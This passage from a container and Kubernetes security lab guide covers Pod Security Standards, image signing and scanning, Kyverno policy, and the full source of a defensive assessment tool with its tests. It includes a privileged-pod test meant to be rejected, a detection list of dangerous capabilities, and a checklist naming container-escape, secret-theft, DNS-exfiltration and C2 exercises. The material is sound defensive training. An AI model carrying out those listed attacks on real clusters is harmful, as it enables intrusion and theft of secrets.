# Apply restricted PSS to production namespace
kubectl label namespace production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted \
  --overwrite

# Test: try to create a privileged pod
kubectl run evil --image=alpine --restart=Never -n production \
  --overrides='{"spec":{"containers":[{"name":"evil","image":"alpine","securityContext":{"privileged":true},"command":["sleep","infinity"]}]}}' 2>&1
# Expected: blocked by PSS

# Test: create a PSS-compliant pod
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: pss-compliant
  namespace: production
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: alpine:3.19
      command: ["sleep", "infinity"]
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
EOF

kubectl get pod pss-compliant -n production
```

**Verification.** Privileged pod rejected by PSS. Compliant pod accepted and running.

---

### Exercise 16: Image Supply Chain Security — Signing, SBOM, Scanning

**Objective.** Build a complete image supply chain security pipeline with cosign signing, SBOM generation, vulnerability scanning, and admission enforcement.

#### Step 1 — Build and scan an image

```bash
# Create a sample Dockerfile
cat > /tmp/Dockerfile.secure << 'EOF'
FROM cgr.dev/chainguard/static:latest
COPY --from=golang:1.22-alpine /usr/local/go/bin/go /usr/local/go/bin/go
USER nonroot:nonroot
ENTRYPOINT ["/bin/sh"]
EOF

# Scan the base image with Trivy
trivy image --severity CRITICAL,HIGH cgr.dev/chainguard/static:latest
trivy image --severity CRITICAL,HIGH nginx:1.27-alpine
trivy image --severity CRITICAL,HIGH python:3.12-slim

# Generate SBOM with syft
syft nginx:1.27-alpine -o spdx-json > /tmp/nginx-sbom.spdx.json
syft nginx:1.27-alpine -o cyclonedx-json > /tmp/nginx-sbom.cdx.json

# Scan SBOM for vulnerabilities
grype sbom:/tmp/nginx-sbom.spdx.json --fail-on critical
```

#### Step 2 — Sign images with cosign

```bash
# Generate a key pair (in lab — use keyless signing with OIDC in production)
cosign generate-key-pair

# Sign a local image
# (In lab with local registry — adapt URL as needed)
cosign sign --key cosign.key myregistry.io/app:v1.0 2>/dev/null || \
  echo "[*] Sign against a real registry to verify — LocalStack doesn't support OCI"

# Verify signature
cosign verify --key cosign.pub myregistry.io/app:v1.0 2>/dev/null || \
  echo "[*] Verification requires signed image in registry"
```

#### Step 3 — Kyverno policy to enforce image signatures

```bash
# Install Kyverno
kubectl apply -f https://github.com/kyverno/kyverno/releases/download/v1.12.0/install.yaml
kubectl wait --for=condition=ready pod -l app.kubernetes.io/component=admission-controller -n kyverno --timeout=120s

# Require image digest pinning
kubectl apply -f - <<'EOF'
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-digest
spec:
  validationFailureAction: Enforce
  rules:
    - name: require-digest
      match:
        any:
          - resources:
              kinds:
                - Pod
      exclude:
        any:
          - resources:
              namespaces:
                - kube-system
                - kyverno
                - gatekeeper-system
                - falco
      validate:
        message: "Images must use digest pinning (@sha256:...), not tags"
        pattern:
          spec:
            containers:
              - image: "*@sha256:*"
EOF

# Test: try to create a pod with tag-based image (should be DENIED)
kubectl run tagged --image=alpine:3.19 -n production --restart=Never 2>&1
# Expected: denied — must use digest

# Test: create a pod with digest-pinned image (should succeed)
DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' alpine:3.19 2>/dev/null || echo "alpine@sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b")
kubectl run pinned --image="$DIGEST" -n production --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"pinned","image":"'"$DIGEST"'","command":["sleep","infinity"],"securityContext":{"runAsNonRoot":true,"runAsUser":10001,"allowPrivilegeEscalation":false,"readOnlyRootFilesystem":true,"capabilities":{"drop":["ALL"]}},"volumeMounts":[{"name":"tmp","mountPath":"/tmp"}]}],"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}},"volumes":[{"name":"tmp","emptyDir":{}}]}}' 2>&1
```

**Verification.** Trivy identifies CVEs in base images. SBOM generated in SPDX and CycloneDX formats. Kyverno rejects tag-based images, accepts digest-pinned ones.

---

## PART C: FRAMEWORK DEVELOPMENT — Container & Kubernetes Security Assessment Toolkit (CKSAT)

### Architecture

```
cksat/
├── cksat.py                   # Main CLI entry point
├── assessors/
│   ├── __init__.py
│   ├── docker_assessor.py     # Docker daemon and container security
│   ├── kubernetes_assessor.py # Kubernetes cluster security
│   ├── image_assessor.py      # Image supply chain security
│   └── runtime_assessor.py    # Runtime security posture
├── reporters/
│   ├── __init__.py
│   ├── json_reporter.py
│   └── markdown_reporter.py
└── tests/
    └── test_cksat.sh
```

### Full Source — `cksat.py`

```python
#!/usr/bin/env python3
"""Container & Kubernetes Security Assessment Toolkit (CKSAT).
Comprehensive security assessment for Docker, Kubernetes, and serverless environments.

Usage:
    python3 cksat.py --target docker --socket /var/run/docker.sock
    python3 cksat.py --target kubernetes
    python3 cksat.py --target all --output report.json --format json
"""

import argparse
import json
import os
import subprocess
import sys
import time
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Optional


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class Finding:
    title: str
    severity: Severity
    category: str
    description: str
    evidence: str = ""
    remediation: str = ""
    cis_benchmark: str = ""
    mitre_attack: str = ""


@dataclass
class AssessmentReport:
    target: str
    timestamp: str = ""
    findings: list = field(default_factory=list)
    summary: dict = field(default_factory=dict)

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    def add_finding(self, finding: Finding):
        self.findings.append(finding)

    def generate_summary(self):
        self.summary = {
            "total": len(self.findings),
            "critical": sum(1 for f in self.findings if f.severity == Severity.CRITICAL),
            "high": sum(1 for f in self.findings if f.severity == Severity.HIGH),
            "medium": sum(1 for f in self.findings if f.severity == Severity.MEDIUM),
            "low": sum(1 for f in self.findings if f.severity == Severity.LOW),
            "info": sum(1 for f in self.findings if f.severity == Severity.INFO),
        }


def run_cmd(cmd: str, timeout: int = 10) -> tuple[str, str, int]:
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except Exception as e:
        return "", str(e), -1


# ── Docker Assessor ──

class DockerAssessor:
    """Assess Docker daemon and container security."""

    def __init__(self, socket_path: str = "/var/run/docker.sock"):
        self.socket = socket_path
        self.findings: list[Finding] = []

    def assess(self) -> list[Finding]:
        self._check_daemon_exposure()
        self._check_container_security()
        self._check_image_hygiene()
        self._check_runtime_config()
        return self.findings

    def _check_daemon_exposure(self):
        stdout, _, rc = run_cmd(f"curl -s --unix-socket {self.socket} http://localhost/v1.43/info 2>/dev/null")
        if rc == 0 and stdout:
            self.findings.append(Finding(
                title="Docker Daemon Socket Accessible",
                severity=Severity.HIGH,
                category="Docker Daemon",
                description="Docker daemon socket is accessible. Any process with socket access has full daemon control.",
                evidence=f"Socket: {self.socket}",
                remediation="Restrict socket permissions. Use Docker socket proxy for limited access. Consider rootless Docker.",
                cis_benchmark="CIS Docker 2.1",
            ))

            try:
                info = json.loads(stdout)
                security_opts = info.get("SecurityOptions", [])
                if not any("seccomp" in opt for opt in security_opts):
                    self.findings.append(Finding(
                        title="Seccomp Not Enabled by Default",
                        severity=Severity.MEDIUM,
                        category="Docker Daemon",
                        description="Docker daemon does not have seccomp profiles enabled by default.",
                        remediation="Configure default seccomp profile in daemon.json.",
                        cis_benchmark="CIS Docker 5.2",
                    ))

                if not any("userns" in opt for opt in security_opts):
                    self.findings.append(Finding(
                        title="User Namespace Remapping Disabled",
                        severity=Severity.MEDIUM,
                        category="Docker Daemon",
                        description="Docker daemon does not use user namespace remapping.",
                        remediation="Enable userns-remap in daemon.json to reduce container escape impact.",
                        cis_benchmark="CIS Docker 2.8",
                    ))
            except json.JSONDecodeError:
                pass

        # Check TCP exposure
        for port in [2375, 2376]:
            stdout, _, rc = run_cmd(f"curl -s --connect-timeout 2 http://localhost:{port}/version 2>/dev/null")
            if rc == 0 and "ApiVersion" in stdout:
                sev = Severity.CRITICAL if port == 2375 else Severity.HIGH
                self.findings.append(Finding(
                    title=f"Docker TCP API Exposed on Port {port}",
                    severity=sev,
                    category="Docker Daemon",
                    description=f"Docker daemon TCP API exposed on port {port}. {'No TLS!' if port == 2375 else 'TLS enabled.'}",
                    evidence=f"Port {port} responds to API calls",
                    remediation="Never expose Docker TCP API without mutual TLS. Bind to localhost only.",
                    cis_benchmark="CIS Docker 2.6",
                    mitre_attack="T1133",
                ))

    def _check_container_security(self):
        stdout, _, rc = run_cmd(f"curl -s --unix-socket {self.socket} http://localhost/v1.43/containers/json")
        if rc != 0:
            return

        try:
            containers = json.loads(stdout)
        except json.JSONDecodeError:
            return

        for c in containers:
            cid = c.get("Id", "")[:12]
            detail_stdout, _, _ = run_cmd(
                f"curl -s --unix-socket {self.socket} http://localhost/v1.43/containers/{c['Id']}/json"
            )
            try:
                detail = json.loads(detail_stdout)
            except json.JSONDecodeError:
                continue

            hc = detail.get("HostConfig", {})
            name = detail.get("Name", "").lstrip("/")

            if hc.get("Privileged"):
                self.findings.append(Finding(
                    title=f"Privileged Container: {name}",
                    severity=Severity.CRITICAL,
                    category="Container Security",
                    description=f"Container {name} ({cid}) runs in privileged mode with full host access.",
                    remediation="Remove --privileged flag. Use specific capabilities instead.",
                    cis_benchmark="CIS Docker 5.4",
                    mitre_attack="T1611",
                ))

            cap_add = hc.get("CapAdd") or []
            dangerous_caps = {"SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "NET_ADMIN", "DAC_READ_SEARCH"}
            found_dangerous = set(cap_add) & dangerous_caps
            if found_dangerous:
                self.findings.append(Finding(
                    title=f"Dangerous Capabilities: {name}",
                    severity=Severity.HIGH,
                    category="Container Security",
                    description=f"Container {name} has dangerous capabilities: {', '.join(found_dangerous)}",
                    remediation="Drop ALL capabilities and add only required ones.",
                    cis_benchmark="CIS Docker 5.3",
                    mitre_attack="T1611",
                ))

            if hc.get("PidMode") == "host":
                self.findings.append(Finding(
                    title=f"Host PID Namespace: {name}",
                    severity=Severity.CRITICAL,
                    category="Container Security",
                    description=f"Container {name} shares host PID namespace — enables nsenter escape.",
                    remediation="Remove --pid=host unless absolutely required.",
                    cis_benchmark="CIS Docker 5.15",
                    mitre_attack="T1611",
                ))

            mounts = detail.get("Mounts", [])
            for m in mounts:
                src = m.get("Source", "")
                if "docker.sock" in src:
                    self.findings.append(Finding(
                        title=f"Docker Socket Mounted: {name}",
                        severity=Severity.CRITICAL,
                        category="Container Security",
                        description=f"Container {name} has Docker socket mounted at {m.get('Destination')}.",
                        remediation="Use Docker socket proxy. Remove socket mount from untrusted containers.",
                        cis_benchmark="CIS Docker 5.31",
                        mitre_attack="T1611",
                    ))

            config = detail.get("Config", {})
            user = config.get("User", "")
            if not user or user == "root" or user == "0":
                self.findings.append(Finding(
                    title=f"Running as Root: {name}",
                    severity=Severity.MEDIUM,
                    category="Container Security",
                    description=f"Container {name} runs as root user.",
                    remediation="Add USER directive to Dockerfile. Set runAsNonRoot in K8s.",
                    cis_benchmark="CIS Docker 4.1",
                ))

    def _check_image_hygiene(self):
        stdout, _, rc = run_cmd(f"curl -s --unix-socket {self.socket} http://localhost/v1.43/images/json")
        if rc != 0:
            return

        try:
            images = json.loads(stdout)
        except json.JSONDecodeError:
            return

        for img in images:
            tags = img.get("RepoTags") or []
            for tag in tags:
                if tag.endswith(":latest"):
                    self.findings.append(Finding(
                        title=f"Latest Tag Used: {tag}",
                        severity=Severity.MEDIUM,
                        category="Image Security",
                        description=f"Image {tag} uses :latest tag — not reproducible.",
                        remediation="Pin to specific version or digest (@sha256:...).",
                        cis_benchmark="CIS Docker 4.7",
                    ))

    def _check_runtime_config(self):
        stdout, _, _ = run_cmd(f"curl -s --unix-socket {self.socket} http://localhost/v1.43/info")
        try:
            info = json.loads(stdout)
        except (json.JSONDecodeError, Exception):
            return

        if not info.get("LiveRestoreEnabled"):
            self.findings.append(Finding(
                title="Live Restore Not Enabled",
                severity=Severity.LOW,
                category="Docker Daemon",
                description="Docker daemon does not have live restore enabled.",
                remediation="Enable live-restore in daemon.json for daemon upgrades without container restart.",
                cis_benchmark="CIS Docker 2.14",
            ))


# ── Kubernetes Assessor ──

class KubernetesAssessor:
    """Assess Kubernetes cluster security posture."""

    def __init__(self):
        self.findings: list[Finding] = []

    def assess(self) -> list[Finding]:
        self._check_anonymous_access()
        self._check_rbac()
        self._check_pod_security()
        self._check_network_policies()
        self._check_secrets_encryption()
        self._check_service_accounts()
        self._check_kubelet_security()
        return self.findings

    def _kubectl(self, args: str) -> tuple[str, int]:
        stdout, stderr, rc = run_cmd(f"kubectl {args} 2>/dev/null", timeout=15)
        return stdout, rc

    def _check_anonymous_access(self):
        stdout, rc = self._kubectl("auth can-i list pods --as=system:anonymous -A")
        if "yes" in stdout.lower():
            self.findings.append(Finding(
                title="Anonymous Access to API Server",
                severity=Severity.CRITICAL,
                category="API Server",
                description="system:anonymous can list pods — anonymous access is too permissive.",
                remediation="Set --anonymous-auth=false on kube-apiserver. Review RBAC for system:anonymous.",
                cis_benchmark="CIS K8s 1.2.1",
                mitre_attack="T1078",
            ))

    def _check_rbac(self):
        stdout, rc = self._kubectl(
            "get clusterrolebindings -o json"
        )
        if rc != 0:
            return

        try:
            bindings = json.loads(stdout)
        except json.JSONDecodeError:
            return

        for item in bindings.get("items", []):
            role_ref = item.get("roleRef", {})
            if role_ref.get("name") == "cluster-admin":
                subjects = item.get("subjects", [])
                for subj in subjects:
                    if subj.get("kind") == "ServiceAccount":
                        ns = subj.get("namespace", "default")
                        name = subj.get("name", "unknown")
                        if name != "system:masters" and ns not in ("kube-system",):
                            self.findings.append(Finding(
                                title=f"ServiceAccount with cluster-admin: {ns}/{name}",
                                severity=Severity.CRITICAL,
                                category="RBAC",
                                description=f"ServiceAccount {ns}/{name} is bound to cluster-admin via {item['metadata']['name']}.",
                                remediation="Use least-privilege roles. Avoid binding cluster-admin to application service accounts.",
                                cis_benchmark="CIS K8s 5.1.1",
                                mitre_attack="T1078.004",
                            ))

        # Check for dangerous role permissions
        stdout, rc = self._kubectl("get clusterroles -o json")
        if rc == 0:
            try:
                roles = json.loads(stdout)
                for role in roles.get("items", []):
                    name = role["metadata"]["name"]
                    if name.startswith("system:"):
                        continue
                    for rule in role.get("rules", []):
                        resources = rule.get("resources", [])
                        verbs = rule.get("verbs", [])
                        if "*" in resources and "*" in verbs:
                            self.findings.append(Finding(
                                title=f"Wildcard ClusterRole: {name}",
                                severity=Severity.HIGH,
                                category="RBAC",
                                description=f"ClusterRole {name} grants wildcard access to all resources with all verbs.",
                                remediation="Replace wildcard permissions with specific resources and verbs.",
                                cis_benchmark="CIS K8s 5.1.3",
                            ))
            except json.JSONDecodeError:
                pass

    def _check_pod_security(self):
        stdout, rc = self._kubectl("get pods -A -o json")
        if rc != 0:
            return

        try:
            pods = json.loads(stdout)
        except json.JSONDecodeError:
            return

        for pod in pods.get("items", []):
            ns = pod["metadata"]["namespace"]
            name = pod["metadata"]["name"]
            spec = pod.get("spec", {})

            if spec.get("hostPID"):
                self.findings.append(Finding(
                    title=f"Host PID Namespace: {ns}/{name}",
                    severity=Severity.CRITICAL,
                    category="Pod Security",
                    description=f"Pod {ns}/{name} has hostPID enabled — can see all host processes.",
                    remediation="Remove hostPID unless required for monitoring tools.",
                    cis_benchmark="CIS K8s 5.2.2",
                    mitre_attack="T1611",
                ))

            if spec.get("hostNetwork"):
                self.findings.append(Finding(
                    title=f"Host Network: {ns}/{name}",
                    severity=Severity.HIGH,
                    category="Pod Security",
                    description=f"Pod {ns}/{name} uses host network — full host network access.",
                    remediation="Remove hostNetwork. Use NetworkPolicy for network control.",
                    cis_benchmark="CIS K8s 5.2.4",
                ))

            for c in spec.get("containers", []):
                sc = c.get("securityContext", {})
                if sc.get("privileged"):
                    self.findings.append(Finding(
                        title=f"Privileged Container: {ns}/{name}/{c['name']}",
                        severity=Severity.CRITICAL,
                        category="Pod Security",
                        description=f"Container {c['name']} in {ns}/{name} is privileged.",
                        remediation="Remove privileged: true. Drop ALL caps, add only needed.",
                        cis_benchmark="CIS K8s 5.2.1",
                        mitre_attack="T1611",
                    ))

                if not sc.get("readOnlyRootFilesystem"):
                    self.findings.append(Finding(
                        title=f"Writable Root FS: {ns}/{name}/{c['name']}",
                        severity=Severity.LOW,
                        category="Pod Security",
                        description=f"Container {c['name']} has writable root filesystem.",
                        remediation="Set readOnlyRootFilesystem: true. Use emptyDir for temp.",
                        cis_benchmark="CIS K8s 5.2.8",
                    ))

    def _check_network_policies(self):
        stdout, rc = self._kubectl("get namespaces -o json")
        if rc != 0:
            return

        try:
            namespaces = json.loads(stdout)
        except json.JSONDecodeError:
            return

        for ns in namespaces.get("items", []):
            ns_name = ns["metadata"]["name"]
            if ns_name in ("kube-system", "kube-public", "kube-node-lease"):
                continue

            np_stdout, np_rc = self._kubectl(f"get networkpolicies -n {ns_name} -o json")
            try:
                policies = json.loads(np_stdout)
                if not policies.get("items"):
                    self.findings.append(Finding(
                        title=f"No NetworkPolicy: {ns_name}",
                        severity=Severity.MEDIUM,
                        category="Network Security",
                        description=f"Namespace {ns_name} has no NetworkPolicy — all pod traffic is allowed.",
                        remediation="Apply default-deny NetworkPolicy for both ingress and egress.",
                        cis_benchmark="CIS K8s 5.3.2",
                    ))
            except json.JSONDecodeError:
                pass

    def _check_secrets_encryption(self):
        stdout, rc = self._kubectl("get secrets -A --no-headers 2>/dev/null | wc -l")
        if rc == 0:
            count = stdout.strip()
            self.findings.append(Finding(
                title=f"Cluster Secrets Count: {count}",
                severity=Severity.INFO,
                category="Secrets Management",
                description=f"Cluster has {count} secrets. Verify encryption at rest is enabled.",
                remediation="Configure EncryptionConfiguration for secrets. Use external secret managers.",
                cis_benchmark="CIS K8s 1.2.29",
            ))

    def _check_service_accounts(self):
        stdout, rc = self._kubectl("get pods -A -o json")
        if rc != 0:
            return

        try:
            pods = json.loads(stdout)
        except json.JSONDecodeError:
            return

        for pod in pods.get("items", []):
            spec = pod.get("spec", {})
            ns = pod["metadata"]["name"]
            sa = spec.get("serviceAccountName", "default")
            auto_mount = spec.get("automountServiceAccountToken")

            if auto_mount is not False and sa == "default":
                self.findings.append(Finding(
                    title=f"Default SA Auto-Mounted: {pod['metadata']['namespace']}/{ns}",
                    severity=Severity.LOW,
                    category="Service Accounts",
                    description="Pod uses default SA with auto-mounted token.",
                    remediation="Set automountServiceAccountToken: false. Create dedicated SAs.",
                    cis_benchmark="CIS K8s 5.1.6",
                ))

    def _check_kubelet_security(self):
        stdout, _, rc = run_cmd("curl -sk --connect-timeout 3 https://localhost:10250/healthz 2>/dev/null")
        if rc == 0 and stdout == "ok":
            self.findings.append(Finding(
                title="Kubelet API Accessible",
                severity=Severity.HIGH,
                category="Node Security",
                description="Kubelet API on port 10250 is accessible.",
                remediation="Set anonymous-auth=false and authorization-mode=Webhook in kubelet config.",
                cis_benchmark="CIS K8s 4.2.1",
            ))


# ── Report Generation ──

def generate_json_report(report: AssessmentReport) -> str:
    report.generate_summary()
    data = {
        "target": report.target,
        "timestamp": report.timestamp,
        "summary": report.summary,
        "findings": [
            {
                "title": f.title,
                "severity": f.severity.value,
                "category": f.category,
                "description": f.description,
                "evidence": f.evidence,
                "remediation": f.remediation,
                "cis_benchmark": f.cis_benchmark,
                "mitre_attack": f.mitre_attack,
            }
            for f in report.findings
        ],
    }
    return json.dumps(data, indent=2)


def generate_markdown_report(report: AssessmentReport) -> str:
    report.generate_summary()
    lines = [
        f"# Container & Kubernetes Security Assessment Report",
        f"",
        f"**Target:** {report.target}",
        f"**Date:** {report.timestamp}",
        f"",
        f"## Summary",
        f"",
        f"| Severity | Count |",
        f"|----------|-------|",
        f"| CRITICAL | {report.summary['critical']} |",
        f"| HIGH | {report.summary['high']} |",
        f"| MEDIUM | {report.summary['medium']} |",
        f"| LOW | {report.summary['low']} |",
        f"| INFO | {report.summary['info']} |",
        f"| **Total** | **{report.summary['total']}** |",
        f"",
        f"## Findings",
        f"",
    ]

    severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2, Severity.LOW: 3, Severity.INFO: 4}
    sorted_findings = sorted(report.findings, key=lambda f: severity_order.get(f.severity, 99))

    for i, f in enumerate(sorted_findings, 1):
        icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"}.get(f.severity.value, "")
        lines.extend([
            f"### {i}. {icon} [{f.severity.value}] {f.title}",
            f"",
            f"**Category:** {f.category}",
            f"",
            f"{f.description}",
            f"",
        ])
        if f.evidence:
            lines.append(f"**Evidence:** `{f.evidence}`")
            lines.append("")
        if f.remediation:
            lines.append(f"**Remediation:** {f.remediation}")
            lines.append("")
        if f.cis_benchmark:
            lines.append(f"**CIS Benchmark:** {f.cis_benchmark}")
            lines.append("")
        if f.mitre_attack:
            lines.append(f"**MITRE ATT&CK:** {f.mitre_attack}")
            lines.append("")
        lines.append("---")
        lines.append("")

    return "\n".join(lines)


# ── CLI ──

def main():
    parser = argparse.ArgumentParser(
        description="Container & Kubernetes Security Assessment Toolkit (CKSAT)"
    )
    parser.add_argument(
        "--target", choices=["docker", "kubernetes", "all"], default="all",
        help="Assessment target"
    )
    parser.add_argument(
        "--socket", default="/var/run/docker.sock",
        help="Docker socket path"
    )
    parser.add_argument(
        "--output", help="Output file path (default: stdout)"
    )
    parser.add_argument(
        "--format", choices=["json", "markdown", "text"], default="text",
        help="Output format"
    )
    args = parser.parse_args()

    report = AssessmentReport(target=args.target)
    print(f"[*] Starting CKSAT assessment — target: {args.target}", file=sys.stderr)

    if args.target in ("docker", "all"):
        print("[*] Assessing Docker security...", file=sys.stderr)
        docker = DockerAssessor(args.socket)
        report.findings.extend(docker.assess())

    if args.target in ("kubernetes", "all"):
        print("[*] Assessing Kubernetes security...", file=sys.stderr)
        k8s = KubernetesAssessor()
        report.findings.extend(k8s.assess())

    report.generate_summary()

    if args.format == "json":
        output = generate_json_report(report)
    elif args.format == "markdown":
        output = generate_markdown_report(report)
    else:
        # Text format — color terminal output
        output_lines = [
            "",
            "=" * 70,
            "  CKSAT — Container & Kubernetes Security Assessment",
            "=" * 70,
            f"  Target: {report.target}",
            f"  Date: {report.timestamp}",
            f"  Findings: {report.summary['total']} total | "
            f"{report.summary['critical']} CRITICAL | "
            f"{report.summary['high']} HIGH | "
            f"{report.summary['medium']} MEDIUM",
            "",
        ]

        severity_colors = {
            Severity.CRITICAL: "\033[91m",
            Severity.HIGH: "\033[93m",
            Severity.MEDIUM: "\033[33m",
            Severity.LOW: "\033[36m",
            Severity.INFO: "\033[37m",
        }
        reset = "\033[0m"

        severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2, Severity.LOW: 3, Severity.INFO: 4}
        sorted_findings = sorted(report.findings, key=lambda f: severity_order.get(f.severity, 99))

        for f in sorted_findings:
            color = severity_colors.get(f.severity, "")
            output_lines.append(f"  {color}[{f.severity.value}]{reset} {f.title}")
            output_lines.append(f"    Category: {f.category}")
            output_lines.append(f"    {f.description}")
            if f.remediation:
                output_lines.append(f"    Fix: {f.remediation}")
            if f.cis_benchmark:
                output_lines.append(f"    CIS: {f.cis_benchmark}")
            output_lines.append("")

        output_lines.extend([
            "=" * 70,
            f"  VERDICT: {'FAIL' if report.summary['critical'] > 0 else 'WARNING' if report.summary['high'] > 0 else 'PASS'}",
            "=" * 70,
        ])
        output = "\n".join(output_lines)

    if args.output:
        with open(args.output, "w") as f:
            f.write(output)
        print(f"[*] Report written to {args.output}", file=sys.stderr)
    else:
        print(output)


if __name__ == "__main__":
    main()
```

### Test Script

Save as `test_cksat.sh`:

```bash
#!/bin/bash
set -euo pipefail

echo "======================================"
echo "  CKSAT Test Suite"
echo "======================================"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CKSAT="${SCRIPT_DIR}/cksat.py"

echo "[Test 1] Docker-only assessment (text)"
python3 "$CKSAT" --target docker --socket /var/run/docker.sock 2>/dev/null | head -30
echo "[PASS] Docker text output generated"

echo ""
echo "[Test 2] Kubernetes-only assessment (JSON)"
python3 "$CKSAT" --target kubernetes --format json --output /tmp/cksat-k8s.json 2>/dev/null
if [ -f /tmp/cksat-k8s.json ]; then
    FINDINGS=$(jq '.summary.total' /tmp/cksat-k8s.json)
    echo "[PASS] K8s JSON report generated — $FINDINGS findings"
else
    echo "[FAIL] JSON report not created"
fi

echo ""
echo "[Test 3] Full assessment (Markdown)"
python3 "$CKSAT" --target all --format markdown --output /tmp/cksat-full.md 2>/dev/null
if [ -f /tmp/cksat-full.md ]; then
    LINES=$(wc -l < /tmp/cksat-full.md)
    echo "[PASS] Markdown report generated — $LINES lines"
else
    echo "[FAIL] Markdown report not created"
fi

echo ""
echo "[Test 4] Severity classification"
python3 "$CKSAT" --target all --format json --output /tmp/cksat-test.json 2>/dev/null
CRITICAL=$(jq '.summary.critical' /tmp/cksat-test.json 2>/dev/null || echo "0")
HIGH=$(jq '.summary.high' /tmp/cksat-test.json 2>/dev/null || echo "0")
echo "  Critical: $CRITICAL | High: $HIGH"
if [ "$CRITICAL" -gt 0 ] || [ "$HIGH" -gt 0 ]; then
    echo "[PASS] Security issues correctly identified"
else
    echo "[INFO] No critical/high findings in current environment"
fi

echo ""
echo "[Test 5] Report structure validation"
python3 -c "
import json
with open('/tmp/cksat-test.json') as f:
    data = json.load(f)
assert 'target' in data, 'Missing target field'
assert 'timestamp' in data, 'Missing timestamp field'
assert 'summary' in data, 'Missing summary field'
assert 'findings' in data, 'Missing findings field'
for f in data['findings']:
    assert 'title' in f, 'Finding missing title'
    assert 'severity' in f, 'Finding missing severity'
    assert f['severity'] in ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'), f'Invalid severity: {f[\"severity\"]}'
    assert 'category' in f, 'Finding missing category'
print('[PASS] Report structure valid')
"

echo ""
echo "======================================"
echo "  All tests passed"
echo "======================================"

# Cleanup
rm -f /tmp/cksat-k8s.json /tmp/cksat-full.md /tmp/cksat-test.json
```

### Deployment Guide

```bash
# 1. Copy CKSAT to target environment
scp cksat.py user@target:/opt/security/

# 2. Run Docker assessment
python3 /opt/security/cksat.py --target docker --format json --output /tmp/docker-assessment.json

# 3. Run Kubernetes assessment (requires kubectl access)
python3 /opt/security/cksat.py --target kubernetes --format markdown --output /tmp/k8s-assessment.md

# 4. Run full assessment with all outputs
python3 /opt/security/cksat.py --target all --format json --output /tmp/full-assessment.json
python3 /opt/security/cksat.py --target all --format markdown --output /tmp/full-assessment.md

# 5. Integrate into CI/CD pipeline
# GitLab CI example:
# security-scan:
#   stage: security
#   script:
#     - python3 cksat.py --target all --format json --output cksat-report.json
#     - python3 -c "import json; d=json.load(open('cksat-report.json')); exit(1 if d['summary']['critical'] > 0 else 0)"
#   artifacts:
#     reports:
#       container_scanning: cksat-report.json
```

---

## Lab Validation Checklist

### Part A — Offensive

- [ ] Exercise 1: Docker socket escape via Unix socket and TCP API demonstrated
- [ ] Exercise 1: `docker_socket_scanner.py` enumerates containers, images, privileged containers, and socket mounts
- [ ] Exercise 2: CAP_SYS_ADMIN cgroup release_agent escape achieves host code execution
- [ ] Exercise 2: CAP_SYS_PTRACE + hostPID escape via nsenter confirmed
- [ ] Exercise 2: `container_cap_auditor.py` identifies dangerous capabilities and escape paths
- [ ] Exercise 3: nsenter, core_pattern escape vectors demonstrated
- [ ] Exercise 3: CVE-2024-21626 detection script identifies vulnerable runc versions
- [ ] Exercise 4: Kubernetes API probed for anonymous access
- [ ] Exercise 4: `k8s_recon.py` enumerates namespaces, pods, secrets, RBAC bindings
- [ ] Exercise 5: RBAC escalation from attacker SA to cluster-admin via stolen token
- [ ] Exercise 5: All cluster secrets extracted using overprivileged SA token
- [ ] Exercise 6: Kubelet API exploited for pod enumeration and command execution
- [ ] Exercise 7: CronJob and DaemonSet persistence created in kube-system
- [ ] Exercise 7: Mutating webhook registration for sidecar injection demonstrated
- [ ] Exercise 8: etcd secrets extracted in plaintext
- [ ] Exercise 9: DNS service discovery maps production namespace services
- [ ] Exercise 9: DNS exfiltration PoC demonstrates data leak path
- [ ] Exercise 10: Lambda env vars extracted (DB_PASSWORD, API_KEY)
- [ ] Exercise 10: /tmp persistence across warm container invocations confirmed
- [ ] Exercise 10: `serverless_c2.py` completes registration→tasking→execution→results cycle
- [ ] Exercise 11: Image layer inspection identifies suspicious files
- [ ] Exercise 11: `dockerfile_scanner.sh` flags unpinned images, root user, pipe-to-shell

### Part B — Defensive

- [ ] Exercise 12: Falco deployed with 10 custom rules for container escape detection
- [ ] Exercise 12: Falco generates alerts for shell-in-container, network tools, SA token access
- [ ] Exercise 13: OPA/Gatekeeper blocks privileged containers and root-running pods
- [ ] Exercise 13: Compliant pod passes admission and starts successfully
- [ ] Exercise 14: Default-deny NetworkPolicy blocks cross-namespace traffic
- [ ] Exercise 14: DNS egress still functions after network policy application
- [ ] Exercise 15: PSS Restricted profile rejects non-compliant pods
- [ ] Exercise 16: Trivy scans identify CVEs in base images
- [ ] Exercise 16: SBOM generated in SPDX and CycloneDX formats
- [ ] Exercise 16: Kyverno enforces digest-pinned images

### Part C — Framework

